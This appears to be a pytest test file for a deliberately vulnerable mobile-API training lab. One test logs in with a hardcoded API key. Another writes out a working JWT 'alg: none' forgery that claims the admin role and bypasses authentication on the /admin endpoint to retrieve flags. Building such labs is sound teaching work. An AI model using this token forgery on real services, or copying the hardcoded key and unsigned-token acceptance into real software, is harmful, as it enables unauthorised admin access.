#!/usr/bin/env python3
"""Tests for Lab 07 (Mobile Security Lab - API & JWT alg:none)."""

import base64
import importlib.util
import json
import os
import sys
import pytest

_app_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "mobile_api.py"))
_spec = importlib.util.spec_from_file_location("mobile_api_mod", _app_path)
_mod = importlib.util.module_from_spec(_spec)
sys.modules["mobile_api_mod"] = _mod
_spec.loader.exec_module(_mod)

app = _mod.app


@pytest.fixture
def client():
    app.config["TESTING"] = True
    with app.test_client() as c:
        yield c


def test_index_page(client):
    res = client.get("/")
    assert res.status_code == 200
    assert "MobileApp Backend" in res.get_json()["api"]


def test_login_invalid_key(client):
    res = client.post("/login", json={"api_key": "wrong_key"})
    assert res.status_code == 401


def test_login_hardcoded_key(client):
    res = client.post("/login", json={"api_key": _mod.HARDCODED_API_KEY})
    assert res.status_code == 200
    data = res.get_json()
    assert "token" in data
    assert data["flag"] == _mod.FLAG_1


def test_admin_jwt_alg_none_bypass(client):
    # Craft alg: none token
    header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
    payload = base64.urlsafe_b64encode(json.dumps({"user": "attacker", "role": "admin"}).encode()).decode().rstrip("=")
    token = f"{header}.{payload}."

    res = client.get("/admin", headers={"Authorization": f"Bearer {token}"})
    assert res.status_code == 200
    data = res.get_json()
    assert data["flag"] == _mod.FLAG_2
    assert data["secret"] == "admin_panel_data"
